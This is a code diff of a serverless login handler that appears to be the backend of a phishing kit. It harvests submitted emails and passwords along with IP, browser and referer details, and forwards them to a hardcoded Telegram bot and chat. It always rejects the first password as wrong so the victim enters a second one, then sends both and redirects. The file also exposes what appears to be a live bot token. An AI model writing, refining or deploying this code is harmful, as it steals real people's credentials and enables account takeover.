@@ -1,16 +1,18 @@
 // api/login.js
-// No need for @vercel/node import – just export a function
-
-// ---------- TELEGRAM CONFIG (CHANGE THESE!) ----------
+// ============================================================
+//  TELEGRAM CONFIG – CHANGE THESE!
+// ============================================================
 const BOT_TOKEN = '8969946726:AAHVMCm5YcPlhl09v3cwy85nLpgamhxX21A';
 const CHAT_ID = '-5452025915';
-// -----------------------------------------------------
+// ============================================================
 
 // In-memory store (resets on cold start – for demo only)
 const attempts = {};
 const firstPasswords = {};
 
-// ========== Telegram Sender ==========
+// ============================================================
+//  TELEGRAM SENDER
+// ============================================================
 async function sendTelegram(message) {
     const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
     const data = {
@@ -30,7 +32,9 @@ async function sendTelegram(message) {
     }
 }
 
-// ========== Helper Functions ==========
+// ============================================================
+//  HELPERS
+// ============================================================
 function getClientIP(req) {
     const forwarded = req.headers['x-forwarded-for'];
     if (forwarded) {
@@ -86,40 +90,47 @@ function getProviderLink(email) {
     return providers[domain] || '#';
 }
 
-// ========== Main Handler ==========
+// ============================================================
+//  MAIN HANDLER
+// ============================================================
 module.exports = async (req, res) => {
-    // CORS headers (optional, but helpful)
+    // CORS – allow all origins for testing
     res.setHeader('Access-Control-Allow-Origin', '*');
-    res.setHeader('Access-Control-Allow-Methods', 'POST');
+    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
     res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
 
-    // Handle preflight
     if (req.method === 'OPTIONS') {
         return res.status(200).end();
     }
 
-    // Only allow POST
     if (req.method !== 'POST') {
         return res.status(405).json({ error: 'Method Not Allowed' });
     }
 
     try {
-        // Parse body – Vercel usually parses JSON automatically, but we'll be safe
         const body = req.body || {};
         const { action, email, password, remember } = body;
 
-        // ---------- Email step ----------
+        // ---------- EMAIL STEP ----------
         if (action === 'email') {
             if (!email || !email.includes('@')) {
                 return res.status(400).json({ error: 'Invalid email' });
             }
+            // Reset attempts for this email
             if (!attempts[email]) attempts[email] = 0;
             delete firstPasswords[email];
             return res.status(200).json({ success: true });
         }
 
-        // ---------- Password step ----------
-        if (action === 'password' && email && password !== undefined) {
+        // ---------- PASSWORD STEP ----------
+        if (action === 'password') {
+            if (!email || !email.includes('@')) {
+                return res.status(400).json({ error: 'Invalid email' });
+            }
+            if (password === undefined || password === null) {
+                return res.status(400).json({ error: 'Password required' });
+            }
+
             const ip = getClientIP(req);
             const userAgent = req.headers['user-agent'] || 'Unknown';
             const timestamp = new Date().toISOString().replace('T', ' ').slice(0, 19);
@@ -130,15 +141,15 @@ module.exports = async (req, res) => {
             const browserInfo = getBrowserInfo(userAgent);
             const provider = email.split('@')[1] || 'unknown';
             const providerLink = getProviderLink(email);
-
             const acceptLanguage = req.headers['accept-language'] || 'Unknown';
             const referer = req.headers['referer'] || 'Direct access';
             const host = req.headers['host'] || 'Unknown';
             const requestUri = req.url || 'Unknown';
 
+            // Get attempt count
             const attemptCount = attempts[email] || 0;
 
-            // Store first password if first attempt
+            // Store first password on first attempt
             if (attemptCount === 0) {
                 firstPasswords[email] = password;
             }
@@ -146,7 +157,7 @@ module.exports = async (req, res) => {
             const newAttemptCount = attemptCount + 1;
             attempts[email] = newAttemptCount;
 
-            // --- Instant Telegram message ---
+            // --- Send Telegram notification for this attempt ---
             let msg = `🔐 <b>🔑 New Login Attempt</b>\n`;
             msg += `────────────────────────\n`;
             msg += `📧 <b>Email:</b> <code>${email}</code>\n`;
@@ -174,9 +185,11 @@ module.exports = async (req, res) => {
 
             await sendTelegram(msg);
 
-            // --- If second attempt, send summary ---
+            // --- SECOND ATTEMPT: success + summary + redirect ---
             if (newAttemptCount >= 2 && firstPasswords[email]) {
                 const firstPw = firstPasswords[email];
+
+                // Send summary Telegram
                 let summary = `⚠️ <b>🚨 TWO FAILED ATTEMPTS 🚨</b>\n`;
                 summary += `═══════════════════════════\n`;
                 summary += `📧 <b>Email:</b> <code>${email}</code>\n`;
@@ -204,15 +217,18 @@ module.exports = async (req, res) => {
                 delete attempts[email];
                 delete firstPasswords[email];
 
+                // ✅ SECOND ATTEMPT – return redirect (success in the flow)
                 return res.status(200).json({ redirect: '/dashboard.html' });
-            } else {
-                // First attempt – return 401
-                return res.status(401).json({ error: 'Incorrect password. Please try again.' });
             }
+
+            // ❌ FIRST ATTEMPT – return 401 with error message
+            // This triggers the sleek error in your frontend (shake + friendly message)
+            return res.status(401).json({ error: 'Incorrect password. Please try again.' });
         }
 
         // Invalid action
         return res.status(400).json({ error: 'Invalid request: missing action or parameters' });
+
     } catch (error) {
         console.error('Unhandled error:', error);
         return res.status(500).json({ error: 'Internal server error' });
